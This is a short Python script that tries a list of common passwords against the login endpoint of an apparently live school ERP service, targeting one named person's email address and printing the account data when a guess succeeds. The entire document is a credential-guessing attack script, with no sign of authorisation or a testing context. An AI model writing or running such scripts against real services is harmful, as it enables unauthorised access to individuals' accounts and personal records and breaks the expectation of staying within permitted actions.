import requests

BASE = "https://edusphere-erp.onrender.com/api/v1"
email = "ishita.anderson@edusphere.edu"
passwords = ["edusphere", "Student@2024", "student123", "password", "student", "123456", "edusphere123"]

for pw in passwords:
    r = requests.post(f"{BASE}/auth/login", json={"email": email, "password": pw}, timeout=15)
    if r.status_code == 200:
        print(f"SUCCESS: {email} / {pw}")
        print(r.json())
        break
    else:
        print(f"FAIL [{r.status_code}]: {pw}")
